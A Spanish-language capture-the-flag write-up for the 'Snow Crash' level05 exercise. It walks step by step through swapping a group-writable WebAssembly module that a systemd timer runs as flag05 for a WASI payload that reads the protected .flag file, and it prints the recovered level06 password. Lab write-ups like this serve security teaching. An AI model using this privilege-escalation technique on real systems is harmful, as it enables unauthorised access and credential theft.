# Level05 - Snow Crash

## Tipo de ejercicio

Reemplazo temporal de un módulo WebAssembly escribible por un grupo de
usuarios y ejecución privilegiada del módulo mediante un servicio `systemd`.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level06`.

El mecanismo real es un runtime WebAssembly llamado
`metaverse`.

## 1. Identificar el componente del nivel

Desde la sesión SSH de `level05`:

```bash
whoami
hostname
pwd
ls -la
cat README
```

El README contiene la pista:

```text
The Metaverse runs on code. Code can be rewritten.
```

El componente específico del nivel es:

```bash
ls -la /opt/snowcrash/level05
file /opt/snowcrash/level05/*
```

Resultado relevante:

```text
/opt/snowcrash/level05/metaverse.wasm: WebAssembly (wasm) binary module
/opt/snowcrash/level05/metaverse.wat:  ASCII text
```

El archivo `metaverse.wat` es una representación textual del módulo y no
contiene la credencial; solo muestra el mensaje `Signal integrity: 91%`.

## 2. Analizar el servicio

```bash
id
cat /etc/systemd/system/metaverse.service
cat /etc/systemd/system/metaverse.timer
systemctl status metaverse.service --no-pager
```

La configuración relevante es:

```ini
[Service]
Type=oneshot
User=flag05
ExecStart=/usr/local/bin/wasmtime --dir=/ /opt/snowcrash/level05/metaverse.wasm
```

El temporizador ejecuta el módulo aproximadamente cada 30 segundos:

```ini
OnUnitActiveSec=30s
```

## 3. Confirmar la vulnerabilidad de permisos

```bash
id
ls -l /opt/snowcrash/level05/metaverse.wasm
```

Resultado relevante:

```text
uid=1006(level05) ... groups=...,986(metaverse),...
-rw-rw-r-- 1 root metaverse ... metaverse.wasm
```

`level05` pertenece al grupo `metaverse`, que tiene permisos de escritura
sobre el módulo que ejecutará el servicio como `flag05`. Este es el camino de
explotación previsto por la OVA.

No se modifica la imagen `.ova` ni se crea una copia alterada. Se modifica
temporalmente el archivo del servidor en ejecución, se deja que el servicio lo
ejecute y se restaura inmediatamente el original.

## 4. Preparar el módulo de explotación

El recurso textual utilizado está disponible en
[metaverse-exploit.wat](metaverse-exploit.wat). Usa las funciones WASI
`path_open`, `fd_read` y `fd_write` para leer `/home/flag05/.flag` como
`flag05` y guardar el resultado en `/tmp/level05_flag.txt`.

Como el recurso se mantiene en el repositorio local y no se incluye ningún
binario, se transfiere a `/tmp` de la OVA desde el equipo anfitrión:

```bash
scp -P 2424 level05/resources/metaverse-exploit.wat \
	level05@localhost:/tmp/metaverse-exploit.wat
```

En la sesión `level05@snowcrash`, se compila con la herramienta disponible en
la OVA:

```bash
wat2wasm /tmp/metaverse-exploit.wat -o /tmp/metaverse-exploit.wasm
```

Antes de reemplazar el módulo, se guarda una copia temporal del original:

```bash
cp /opt/snowcrash/level05/metaverse.wasm /tmp/metaverse-original.wasm
cp /tmp/metaverse-exploit.wasm /opt/snowcrash/level05/metaverse.wasm
```

## 5. Obtener la credencial

El temporizador ejecuta el módulo reemplazado como `flag05`. Después del
siguiente ciclo se lee el archivo creado por el payload:

```bash
cat /tmp/level05_flag.txt
```

El resultado fue:

```text
viuaaale9huek52boumoomioc
```

## 6. Restaurar el servidor

Una vez recuperada la credencial, se restaura el módulo original:

```bash
cp /tmp/metaverse-original.wasm /opt/snowcrash/level05/metaverse.wasm
```

Los artefactos temporales se pueden eliminar después:

```bash
rm -f /tmp/metaverse-original.wasm \
			/tmp/metaverse-exploit.wasm \
			/tmp/metaverse-exploit.wat \
			/tmp/level05_flag.txt
```

## 7. Conectarse a level06

Desde el equipo anfitrión:

```bash
exit
ssh level06@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
viuaaale9huek52boumoomioc
```

## Conclusión

Un servicio `systemd` ejecuta un
módulo WebAssembly como `flag05`. La pertenencia de `level05` al grupo
`metaverse` permite escribir temporalmente el módulo. El payload WASI lee el
archivo protegido `.flag`, recupera la credencial de `level06` y después se
restaura el módulo original del servidor.
